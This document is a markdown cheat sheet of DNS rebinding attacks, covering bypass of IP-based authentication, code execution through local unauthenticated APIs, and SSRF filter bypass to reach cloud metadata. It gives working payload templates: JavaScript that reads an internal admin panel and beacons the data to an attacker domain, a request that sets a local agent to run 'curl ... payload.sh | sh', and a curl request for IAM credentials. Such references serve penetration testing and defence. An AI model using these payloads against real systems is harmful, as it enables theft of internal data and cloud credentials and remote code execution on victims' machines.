# DNS Rebinding

## Table of Contents
- [Bypassing IP-based Authentication](#bypassing-ip-based-authentication)
- [RCE](#rce)
- [Chaining with SSRF](#chaining-with-ssrf)

## Bypassing IP-based Authentication

### Internal web services that trust the network location of a request can be read from an attacker's page, because the browser treats the rebound domain as the same origin. [^1]

- Exfiltrating data from an internal admin panel
    1. The attacker's domain first resolves to the attacker's server, which serves the page below, and then resolves to the internal service once the short TTL expires
        ```bash
        dig +short rebind.[ATTACKER-DOMAIN]  # first lookup
        [ATTACKER-SERVER-IP]

        dig +short rebind.[ATTACKER-DOMAIN]  # after the TTL expires
        [INTERNAL-SERVICE-IP]
        ```

    2. The page waits for the DNS cache to expire, then sends same-origin requests that now reach the internal service and can read its responses
        ```html
        <!-- Served from http://rebind.[ATTACKER-DOMAIN]:8080, the same port as the internal service -->
        <script>
            setTimeout(async () => {
                const response = await fetch('/admin/users');
                const data = await response.text();

                navigator.sendBeacon('https://[ATTACKER-DOMAIN]/', data);
            }, 60000);
        </script>
        ```

## RCE

### Unauthenticated APIs that listen only on the victim's own machine can be driven from a web page, which can lead to code execution on that machine. [^1]

- Changing the settings of a local agent so that it runs an attacker-chosen command
    ```html
    <!-- Served from http://rebind.[ATTACKER-DOMAIN]:9091, which now resolves to 127.0.0.1 -->
    <script>
        fetch('/rpc', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                method: 'settings.update',
                params: { 'on-complete-script': 'curl https://[ATTACKER-DOMAIN]/payload.sh | sh' }
            })
        });
    </script>
    ```

- Taking over a BitTorrent client through its local RPC interface
    - NVD, [CVE-2018-5702: Transmission RPC reachable through DNS rebinding](https://nvd.nist.gov/vuln/detail/CVE-2018-5702)

## Chaining with SSRF

### Server-side filters that block internal addresses can be bypassed, giving access to internal services and cloud metadata. [^2]

- Retrieving security credentials from instance metadata [^3]
    1. The service checks the resolved address, then lets the HTTP client resolve the hostname again
        ```python
        def fetch(url):
            host = urlparse(url).hostname

            # First lookup: [ATTACKER-SERVER-IP]
            if ipaddress.ip_address(socket.gethostbyname(host)).is_private:
                raise ValueError("Internal address")

            # Second lookup: 169.254.169.254
            return requests.get(url)
        ```

    2. The request passes the check but is sent to the metadata endpoint
        ```bash
        curl https://[VULNERABLE-SERVICE]/fetch?url=http://rebind.[ATTACKER-DOMAIN]/latest/meta-data/iam/security-credentials/
        ```

- Bypassing an SSRF mitigation in a CMS to obtain cloud IAM keys
    - NVD, [CVE-2021-22969: Concrete CMS SSRF mitigation bypass using DNS rebinding](https://nvd.nist.gov/vuln/detail/CVE-2021-22969)

[^1]: Applies when the target service does not validate the `Host` header, because requests carry the attacker's domain in it. The browser does not send the target service's cookies, so only services that grant access by network location alone are affected. Recent Chromium-based browsers ask the user for permission before a public page can send requests to the local network (Local Network Access), which blocks this attack unless the user allows it.
[^2]: Applies when the service validates the resolved IP address and then resolves the hostname again for the actual request, instead of connecting to the validated address.
[^3]: Based on IMDSv1 (AWS)
